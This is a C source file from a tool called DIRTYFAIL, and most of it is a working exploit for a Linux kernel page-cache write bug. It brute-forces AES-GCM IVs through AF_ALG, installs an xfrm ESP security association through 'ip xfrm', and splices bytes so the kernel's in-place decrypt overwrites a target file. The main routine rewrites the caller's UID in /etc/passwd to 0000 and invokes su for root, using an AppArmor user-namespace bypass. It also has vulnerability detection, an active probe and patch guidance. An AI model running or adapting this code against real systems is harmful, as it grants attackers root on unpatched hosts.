/*
 * DIRTYFAIL — copyfail_gcm.c
 *
 * See copyfail_gcm.h for the design notes. This file implements:
 *
 *   1. AES-GCM keystream byte 0 computation via AF_ALG `gcm(aes)`.
 *   2. IV brute force until keystream[0] equals the desired XOR mask.
 *   3. SA installation via `ip xfrm state add ...` (system(3) — saves
 *      ~150 lines of netlink boilerplate vs. our authencesn path; the
 *      gcm primitive is the right place to take that dep, and every
 *      modern distro ships iproute2).
 *   4. Splice trigger: ESP wire header (16B) + 1 target byte + 16-byte
 *      ICV pad. The kernel's in-place GCM decrypt XORs keystream[0]
 *      onto the spliced page-cache byte, which is what we control.
 */

#include "copyfail_gcm.h"
#include "apparmor_bypass.h"

#include <fcntl.h>
#include <pwd.h>
#include <stdarg.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/uio.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#ifdef __linux__
#include <sched.h>
#include <sys/syscall.h>
#include <linux/if.h>
#include <sys/ioctl.h>

extern ssize_t splice(int fd_in, loff_t *off_in, int fd_out, loff_t *off_out,
                      size_t len, unsigned int flags);
#endif

#ifndef UDP_ENCAP
#define UDP_ENCAP 100
#endif
#ifndef UDP_ENCAP_ESPINUDP
#define UDP_ENCAP_ESPINUDP 2
#endif

#define ENCAP_PORT  4500
#define ESP_SPI     0xCAFEBABE
#define IV_LEN      8
#define ICV_LEN     16
#define AES_KEY_LEN 16
#define SALT_LEN    4
#define KEY_TOTAL   (AES_KEY_LEN + SALT_LEN)   /* rfc4106 expects 20 */

/* Fixed AEAD key (16-byte AES key + 4-byte salt). Both are attacker-
 * chosen — auth verification will fail at the end of decrypt anyway,
 * the STORE has already happened by then. */
__attribute__((unused))
static const unsigned char AEAD_KEY[KEY_TOTAL] = {
    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f,
    0x10, 0x11, 0x12, 0x13,
};

/* ---------------------------------------------------------------- *
 * Detection
 * ---------------------------------------------------------------- */

df_result_t copyfail_gcm_detect(void)
{
    log_step("Copy Fail GCM variant — detection");

    int km, kn;
    if (kernel_version(&km, &kn))
        log_hint("kernel %d.%d.x", km, kn);

    /* Probe AF_ALG availability of rfc4106(gcm(aes)). */
    int s = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (s < 0) {
        log_ok("AF_ALG unavailable — GCM variant unreachable");
        return DF_PRECOND_FAIL;
    }
    struct sockaddr_alg_compat sa = { .salg_family = AF_ALG };
    strncpy((char *)sa.salg_type, "aead",                 sizeof(sa.salg_type) - 1);
    strncpy((char *)sa.salg_name, "rfc4106(gcm(aes))",    sizeof(sa.salg_name) - 1);
    if (bind(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        log_ok("rfc4106(gcm(aes)) not loadable — GCM variant unreachable");
        close(s);
        return DF_PRECOND_FAIL;
    }
    close(s);
    log_ok("AF_ALG + rfc4106(gcm(aes)) loadable");

    bool userns = unprivileged_userns_allowed();
    log_hint("unprivileged user namespace: %s", userns ? "allowed" : "DENIED");

    if (!userns) {
        log_warn("preconditions partial — userns blocked. Try with --aa-bypass.");
        return DF_PRECOND_FAIL;
    }

    if (apparmor_userns_caps_blocked()) {
        log_ok("LSM-mitigated — unprivileged userns lacks caps; xfrm SA install "
               "via `ip xfrm` requires CAP_NET_ADMIN that the AA policy denies.");
        return DF_PRECOND_FAIL;
    }

    if (dirtyfail_active_probes) {
        log_step("--active set: firing rfc4106(gcm) trigger against /tmp sentinel");
        df_result_t pr = copyfail_gcm_active_probe();
        if (pr == DF_VULNERABLE || pr == DF_OK || pr == DF_PRECOND_FAIL) return pr;
        log_warn("active probe inconclusive — falling back to precondition verdict");
    }

    log_warn("VULNERABLE — GCM-variant of xfrm-ESP page-cache write reachable");
    log_warn("apply mainline patch f4c50a4034e6 or distro backport");
    log_hint("re-run with `--scan --active` for an empirical sentinel-STORE probe");
    return DF_VULNERABLE;
}

/* ---------------------------------------------------------------- *
 * AES-GCM keystream byte 0 — computed via AF_ALG `ecb(aes)` instead
 * of `aead gcm(aes)`.
 *
 * BACKGROUND
 * ----------
 * Originally we used AF_ALG `aead` `gcm(aes)`: bind, set key + tag size,
 * sendmsg with assoclen=0 + 1-byte zero plaintext, read back 17 bytes
 * of (ciphertext || tag). The first byte of the output IS the keystream
 * byte we want (since pt=0 means ct = ks XOR 0 = ks).
 *
 * That worked in unit tests on some kernels but on Ubuntu 24.04 / 6.8
 * the read() blocks indefinitely — the 1-byte AEAD plaintext doesn't
 * produce output until additional data is sent or the socket is shut
 * down. Tracking down the exact "what does this kernel want" was a rat
 * hole.
 *
 * Instead, we compute keystream byte 0 directly. Per NIST SP 800-38D,
 * GCM with a 12-byte nonce derives the initial counter as
 *   J0 = nonce || 0x00000001
 * and the counter for the first plaintext block is J0 + 1 =
 *   nonce || 0x00000002
 * The keystream block is E_K(that counter), so:
 *   keystream[0] = AES-128-ECB(K, nonce || 0x00000002)[0]
 *
 * AF_ALG `ecb(aes)` is bulletproof — single-block in, single-block out,
 * no MSG_MORE / shutdown semantics to get wrong. ~6 µs per call on a
 * 4-core VM, vs ~50 µs for the AEAD path that didn't actually work.
 *
 * (cf2's copyfail2.c uses OpenSSL EVP_aes_128_gcm to do the same
 * computation indirectly. We avoid the libssl dependency by going
 * through AF_ALG ECB directly.)
 * ---------------------------------------------------------------- */

#ifdef __linux__

static int gcm_open(void)
{
    int s = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (s < 0) return -1;
    struct sockaddr_alg_compat sa = { .salg_family = AF_ALG };
    strncpy((char *)sa.salg_type, "skcipher", sizeof(sa.salg_type) - 1);
    strncpy((char *)sa.salg_name, "ecb(aes)", sizeof(sa.salg_name) - 1);
    if (bind(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        close(s); return -1;
    }
    if (setsockopt(s, SOL_ALG, ALG_SET_KEY,
                   AEAD_KEY, AES_KEY_LEN) < 0) {     /* AES-128 key */
        close(s); return -1;
    }
    return s;
}

/* Compute byte 0 of the GCM keystream for the given 12-byte nonce by
 * ECB-encrypting the counter block (nonce || 0x00000002). */
static bool gcm_keystream_byte0(int ecb_s, const uint8_t nonce[12],
                                uint8_t *out_byte)
{
    int op = accept(ecb_s, NULL, NULL);
    if (op < 0) return false;

    /* Counter block: J0 + 1 = nonce(12) || 0x00000002. The +1 is
     * because GCM reserves J0 itself for the auth-tag XOR, so the
     * first plaintext block uses J0+1. */
    uint8_t block[16];
    memcpy(block, nonce, 12);
    block[12] = 0; block[13] = 0; block[14] = 0; block[15] = 2;

    char cbuf[CMSG_SPACE(sizeof(unsigned int))] = {0};
    unsigned int op_enc = ALG_OP_ENCRYPT;

    struct msghdr msg = { .msg_control = cbuf, .msg_controllen = sizeof(cbuf) };
    struct cmsghdr *c = CMSG_FIRSTHDR(&msg);
    c->cmsg_level = SOL_ALG;
    c->cmsg_type  = ALG_SET_OP;
    c->cmsg_len   = CMSG_LEN(sizeof(unsigned int));
    memcpy(CMSG_DATA(c), &op_enc, sizeof(op_enc));

    struct iovec iov = { .iov_base = block, .iov_len = 16 };
    msg.msg_iov = &iov; msg.msg_iovlen = 1;

    if (sendmsg(op, &msg, 0) != 16) { close(op); return false; }

    uint8_t out[16];
    ssize_t n = read(op, out, 16);
    close(op);
    if (n != 16) return false;
    *out_byte = out[0];
    return true;
}

/* Brute force IV until keystream byte equals want_ks. Returns iters
 * tried; writes the winning 8-byte IV into iv_out. */
static int64_t gcm_brute_iv(uint8_t want_ks, uint8_t iv_out[IV_LEN])
{
    int s = gcm_open();
    if (s < 0) {
        log_bad("gcm_open: %s", strerror(errno));
        return -1;
    }
    uint8_t nonce[12];
    memcpy(nonce, AEAD_KEY + AES_KEY_LEN, SALT_LEN);  /* salt prefix */

    for (uint64_t v = 1; v < (1ULL << 32); v++) {
        memcpy(nonce + SALT_LEN, &v, IV_LEN);  /* low 8 bytes */
        uint8_t ks;
        if (!gcm_keystream_byte0(s, nonce, &ks)) {
            close(s);
            return -1;
        }
        if (ks == want_ks) {
            memcpy(iv_out, &v, IV_LEN);
            close(s);
            return (int64_t)v;
        }
        if ((v & 0xFFF) == 0 && v > 16384) {
            /* progress hint after 16k attempts (very unlucky case). */
            log_hint("gcm IV brute: %llu trials so far...",
                     (unsigned long long)v);
        }
    }
    close(s);
    return -1;
}

/* ---------------------------------------------------------------- *
 * SA install via `ip xfrm state add ...`
 * ---------------------------------------------------------------- */

static bool ip_run(const char *fmt, ...)
{
    char cmd[2048];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(cmd, sizeof(cmd), fmt, ap);
    va_end(ap);
    int rc = system(cmd);
    return rc == 0;
}

static bool gcm_install_sa(const uint8_t iv[IV_LEN])
{
    char keyhex[KEY_TOTAL * 2 + 3];
    char *p = keyhex;
    p += sprintf(p, "0x");
    for (int i = 0; i < KEY_TOTAL; i++)
        p += sprintf(p, "%02x", AEAD_KEY[i]);

    /* `ip xfrm state add` registers a transport-mode ESP SA over
     * loopback with rfc4106(gcm(aes)) AEAD. Encap is ESPINUDP/4500
     * matching what we'll send via splice. */
    (void)iv;  /* IV travels in the wire packet, not the SA. */
    return ip_run(
        "ip link set lo up >/dev/null 2>&1 ; "
        "ip xfrm state flush >/dev/null 2>&1 ; "
        "ip xfrm state add src 127.0.0.1 dst 127.0.0.1 proto esp "
        "spi 0x%08x encap espinudp %d %d 0.0.0.0 "
        "aead 'rfc4106(gcm(aes))' %s 128 replay-window 32 >/dev/null 2>&1",
        ESP_SPI, ENCAP_PORT, ENCAP_PORT, keyhex);
}

/* ---------------------------------------------------------------- *
 * Splice trigger
 * ---------------------------------------------------------------- */

static bool gcm_trigger(const char *target_path, off_t target_off,
                        const uint8_t iv[IV_LEN])
{
    int rs = socket(AF_INET, SOCK_DGRAM, 0);
    if (rs < 0) return false;
    int encap = UDP_ENCAP_ESPINUDP;
    setsockopt(rs, IPPROTO_UDP, UDP_ENCAP, &encap, sizeof(encap));
    struct sockaddr_in la = {
        .sin_family = AF_INET,
        .sin_port   = htons(ENCAP_PORT),
        .sin_addr.s_addr = htonl(INADDR_LOOPBACK),
    };
    int reuse = 1;
    setsockopt(rs, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
    if (bind(rs, (struct sockaddr *)&la, sizeof(la)) < 0) {
        close(rs); return false;
    }

    /* Build attacker page in /tmp: ESP header(16) + ICV pad at offset
     * 4096. We splice these from a real file so the kernel sees them
     * as page-cache pages on the splice path. */
    char atkpath[64];
    snprintf(atkpath, sizeof(atkpath), "/tmp/dirtyfail-gcm.%d", (int)getpid());
    unlink(atkpath);
    int afd = open(atkpath, O_RDWR | O_CREAT | O_EXCL, 0600);
    if (afd < 0) { close(rs); return false; }

    unsigned char esp_hdr[16];
    *(uint32_t *)(esp_hdr + 0) = htonl(ESP_SPI);
    *(uint32_t *)(esp_hdr + 4) = htonl(1);             /* SeqNum */
    memcpy(esp_hdr + 8, iv, IV_LEN);
    if (pwrite(afd, esp_hdr, 16, 0) != 16) goto fail;

    unsigned char icv[ICV_LEN] = {0};
    if (pwrite(afd, icv, ICV_LEN, 4096) != ICV_LEN) goto fail;
    fsync(afd);
#ifdef POSIX_FADV_DONTNEED
    posix_fadvise(afd, 0, 0, POSIX_FADV_DONTNEED);
#endif

    int afd2 = open(atkpath, O_RDONLY);
    if (afd2 < 0) goto fail;
    unlink(atkpath);

    int tfd = open(target_path, O_RDONLY);
    if (tfd < 0) { close(afd2); goto fail; }

    int p[2];
    if (pipe(p) < 0) { close(afd2); close(tfd); goto fail; }
    fcntl(p[0], F_SETPIPE_SZ, 1 << 20);
    fcntl(p[1], F_SETPIPE_SZ, 1 << 20);

    /* esp_hdr (16) || target_byte (1) || icv_pad (16) — 33 bytes total. */
    loff_t off;
    off = 0;       if (splice(afd2, &off, p[1], NULL, 16, SPLICE_F_MOVE) != 16) goto trig_fail;
    off = target_off; if (splice(tfd,  &off, p[1], NULL, 1,  SPLICE_F_MOVE) != 1)  goto trig_fail;
    off = 4096;    if (splice(afd2, &off, p[1], NULL, 16, SPLICE_F_MOVE) != 16) goto trig_fail;

    int ss = socket(AF_INET, SOCK_DGRAM, 0);
    if (ss < 0) goto trig_fail;
    if (connect(ss, (struct sockaddr *)&la, sizeof(la)) < 0) { close(ss); goto trig_fail; }
    ssize_t sent = splice(p[0], NULL, ss, NULL, 16 + 1 + 16, SPLICE_F_MOVE);
    (void)sent;
    close(ss);
    close(p[0]); close(p[1]);

    /* Wait for esp_input to finish the in-place STORE before we
     * tear down sockets. 150ms matches V4bel's reference; 50ms was
     * working on x86 lab kernels but tight on ARM64 / loaded VMs. */
    usleep(150 * 1000);
    unsigned char drain[256];
    (void)recv(rs, drain, sizeof(drain), MSG_DONTWAIT);

    close(afd2); close(tfd); close(afd); close(rs);
    return true;

trig_fail:
    close(p[0]); close(p[1]); close(afd2); close(tfd);
fail:
    close(afd); close(rs);
    unlink(atkpath);
    return false;
}

/* ---------------------------------------------------------------- *
 * Public 1-byte primitive
 * ---------------------------------------------------------------- */

bool cfg_1byte_write(const char *target_path,
                     off_t target_off, unsigned char want_byte)
{
    /* Read current byte. */
    int tfd = open(target_path, O_RDONLY);
    if (tfd < 0) {
        log_bad("open %s: %s", target_path, strerror(errno));
        return false;
    }
    unsigned char cur = 0;
    if (pread(tfd, &cur, 1, target_off) != 1) {
        log_bad("pread current: %s", strerror(errno));
        close(tfd); return false;
    }
    close(tfd);

    if (cur == want_byte) {
        return true;   /* already what we want */
    }

    uint8_t want_ks = cur ^ want_byte;

    log_step("cfg_1byte_write off=%lld 0x%02x -> 0x%02x (need_ks=0x%02x)",
             (long long)target_off, cur, want_byte, want_ks);

    /* Brute force IV via AF_ALG. */
    uint8_t iv[IV_LEN];
    int64_t iters = gcm_brute_iv(want_ks, iv);
    if (iters < 0) {
        log_bad("gcm IV brute force failed (want_ks=0x%02x)", want_ks);
        return false;
    }
    log_step("  IV found in %lld iters", (long long)iters);

    /* Install SA. */
    if (!gcm_install_sa(iv)) {
        log_bad("ip xfrm state add failed");
        return false;
    }
    log_step("  SA installed");

    /* Trigger. */
    if (!gcm_trigger(target_path, target_off, iv)) {
        log_bad("gcm trigger failed");
        return false;
    }
    log_step("  trigger fired");

    /* Verify. */
    int v = open(target_path, O_RDONLY);
    if (v < 0) return false;
    unsigned char post = 0;
    if (pread(v, &post, 1, target_off) != 1) { close(v); return false; }
    close(v);
    if (post != want_byte) {
        log_bad("byte at off=%lld is 0x%02x, wanted 0x%02x",
                (long long)target_off, post, want_byte);
        return false;
    }
    return true;
}

#else  /* !__linux__ */
bool cfg_1byte_write(const char *p, off_t o, unsigned char b)
{ (void)p; (void)o; (void)b; return false; }
#endif

/* ---------------------------------------------------------------- *
 * Top-level exploit (UID flip end-to-end)
 * ---------------------------------------------------------------- */

/* INNER (bypass userns): cfg_1byte_write × 4 to flip UID digits to '0'. */
df_result_t copyfail_gcm_exploit_inner(void)
{
#ifdef __linux__
    const char *user = getenv("DIRTYFAIL_TARGET_USER");
    if (!user || !*user) {
        log_bad("inner: DIRTYFAIL_TARGET_USER not set");
        return DF_TEST_ERROR;
    }
    off_t  uid_off; size_t uid_len; char uid_str[16];
    if (!find_passwd_uid_field(user, &uid_off, &uid_len, uid_str)) {
        log_bad("inner: find_passwd_uid_field('%s') failed", user);
        return DF_TEST_ERROR;
    }
    if (uid_len != 4) {
        log_bad("inner: UID '%s' not 4 chars", uid_str);
        return DF_TEST_ERROR;
    }
    for (size_t i = 0; i < 4; i++) {
        if (uid_str[i] == '0') continue;
        log_step("inner: flip /etc/passwd[%lld] '%c' -> '0'",
                 (long long)(uid_off + i), uid_str[i]);
        if (!cfg_1byte_write("/etc/passwd", uid_off + i, '0')) {
            log_bad("inner: byte flip failed at offset %lld",
                    (long long)(uid_off + i));
            return DF_EXPLOIT_FAIL;
        }
    }
    return DF_EXPLOIT_OK;
#else
    return DF_TEST_ERROR;
#endif
}

/* OUTER (init ns): prompts → fork bypass child → wait → verify → su. */
df_result_t copyfail_gcm_exploit(bool do_shell)
{
    log_step("Copy Fail GCM variant — exploit");

    uid_t target_uid = getuid();
    if (target_uid == 0) {
        log_warn("already root in init namespace");
        return DF_OK;
    }

    struct passwd *pw = getpwuid(target_uid);
    if (!pw) { log_bad("getpwuid: %s", strerror(errno)); return DF_TEST_ERROR; }
    const char *user = pw->pw_name;

    off_t  uid_off; size_t uid_len; char uid_str[16];
    if (!find_passwd_uid_field(user, &uid_off, &uid_len, uid_str)) {
        log_bad("user %s not found in /etc/passwd", user);
        return DF_TEST_ERROR;
    }
    log_step("/etc/passwd UID for %s: '%s' at offset %lld",
             user, uid_str, (long long)uid_off);
    if (uid_len != 4) {
        log_bad("UID '%s' is %zu chars; need 4", uid_str, uid_len);
        return DF_TEST_ERROR;
    }

    log_warn("about to flip /etc/passwd UID via rfc4106(gcm(aes)) byte-flips");
    log_warn("(four 1-byte writes — one per UID digit not already '0')");
    if (!typed_confirm("DIRTYFAIL"))    { log_bad("confirmation declined"); return DF_OK; }
    if (!ssh_lockout_check(user))       { log_bad("ssh-lockout declined");  return DF_OK; }

    setenv("DIRTYFAIL_INNER_MODE",  "gcm", 1);
    setenv("DIRTYFAIL_TARGET_USER", user,  1);

    int rc = apparmor_bypass_fork_arm(0, NULL);
    if (rc != DF_EXPLOIT_OK) {
        log_bad("inner exploit failed (exit=%d)", rc);
        return DF_EXPLOIT_FAIL;
    }

    /* Verify in init ns */
    int v = open("/etc/passwd", O_RDONLY);
    if (v < 0) return DF_EXPLOIT_FAIL;
    if (lseek(v, uid_off, SEEK_SET) != uid_off) { close(v); return DF_EXPLOIT_FAIL; }
    char land[5] = {0};
    if (read(v, land, 4) != 4) { close(v); return DF_EXPLOIT_FAIL; }
    close(v);
    if (memcmp(land, "0000", 4) != 0) {
        log_bad("verify: page cache reads '%.4s'", land);
        return DF_EXPLOIT_FAIL;
    }
    log_ok("page cache now reports %s with uid 0 (via GCM path)", user);

    if (!do_shell) {
        if (try_revert_passwd_page_cache())
            log_ok("page cache reverted (--no-shell)");
        else
            log_warn("page cache may still be modified — `sudo dirtyfail --cleanup` or reboot");
        return DF_EXPLOIT_OK;
    }

    log_ok("invoking 'su %s' in init ns — enter your password for REAL root", user);
    execlp("su", "su", user, (char *)NULL);
    log_bad("execlp: %s", strerror(errno));
    return DF_EXPLOIT_FAIL;
}

/* ---------------------------------------------------------------- *
 * Active probe — `--scan --active`.
 *
 * Install GCM SA with an arbitrary IV and fire ONE trigger against a
 * /tmp sentinel. We skip the IV brute force: keystream XOR ciphertext
 * is unpredictable but ANY byte change at sentinel[0] proves the
 * kernel ran the in-place STORE.
 * ---------------------------------------------------------------- */

df_result_t copyfail_gcm_active_probe_inner(void)
{
#ifdef __linux__
    const char *sentinel = getenv("DIRTYFAIL_PROBE_SENTINEL");
    if (!sentinel || !*sentinel) {
        log_bad("gcm-probe: DIRTYFAIL_PROBE_SENTINEL not set");
        return DF_TEST_ERROR;
    }

    /* Arbitrary fixed 8-byte wire IV (rfc4106 wraps it with the 4-byte
     * SA salt to form the 12-byte GCM nonce). Keystream is deterministic
     * given this IV + key, but we don't need to predict it for the
     * probe — any byte change in sentinel[0] proves the STORE happened. */
    static const uint8_t probe_iv[IV_LEN] = {
        0xDE, 0xAD, 0xBE, 0xEF, 0x01, 0x02, 0x03, 0x04
    };

    if (!gcm_install_sa(probe_iv)) {
        log_bad("gcm-probe: ip xfrm state add failed");
        return DF_TEST_ERROR;
    }
    if (!gcm_trigger(sentinel, 0, probe_iv)) {
        log_bad("gcm-probe: trigger failed");
        return DF_TEST_ERROR;
    }
    return DF_EXPLOIT_OK;
#else
    return DF_TEST_ERROR;
#endif
}

df_result_t copyfail_gcm_active_probe(void)
{
    char tmpl[] = "/tmp/dirtyfail-gcm-probe.XXXXXX";
    int sfd = mkstemp(tmpl);
    if (sfd < 0) { log_bad("gcm-probe mkstemp: %s", strerror(errno)); return DF_TEST_ERROR; }
    unsigned char filler[4096];
    memset(filler, 'A', sizeof(filler));
    if (write(sfd, filler, sizeof(filler)) != (ssize_t)sizeof(filler)) {
        close(sfd); unlink(tmpl); return DF_TEST_ERROR;
    }
    close(sfd);

    int rfd = open(tmpl, O_RDONLY);
    if (rfd < 0) { unlink(tmpl); return DF_TEST_ERROR; }
    char tmp[4096];
    if (read(rfd, tmp, sizeof(tmp)) != (ssize_t)sizeof(tmp)) {
        close(rfd); unlink(tmpl); return DF_TEST_ERROR;
    }
    close(rfd);

    setenv("DIRTYFAIL_INNER_MODE",     "gcm-probe", 1);
    setenv("DIRTYFAIL_PROBE_SENTINEL", tmpl,        1);
    int rc = apparmor_bypass_fork_arm(0, NULL);
    unsetenv("DIRTYFAIL_INNER_MODE");
    unsetenv("DIRTYFAIL_PROBE_SENTINEL");

    if (rc == DF_PRECOND_FAIL) { unlink(tmpl); return DF_PRECOND_FAIL; }
    if (rc != DF_EXPLOIT_OK)   {
        log_bad("gcm-probe inner failed (exit=%d)", rc);
        unlink(tmpl); return DF_TEST_ERROR;
    }

    rfd = open(tmpl, O_RDONLY);
    if (rfd < 0) { unlink(tmpl); return DF_TEST_ERROR; }
    unsigned char after[16];
    ssize_t got = read(rfd, after, sizeof(after));
    close(rfd);
    unlink(tmpl);
    if (got <= 0) return DF_TEST_ERROR;

    if (after[0] != 'A') {
        log_warn("ACTIVE PROBE gcm: sentinel[0] changed 'A' → 0x%02x → kernel is VULNERABLE",
                 after[0]);
        return DF_VULNERABLE;
    }
    log_ok("ACTIVE PROBE gcm: sentinel[0] intact — kernel rfc4106 path appears patched");
    return DF_OK;
}
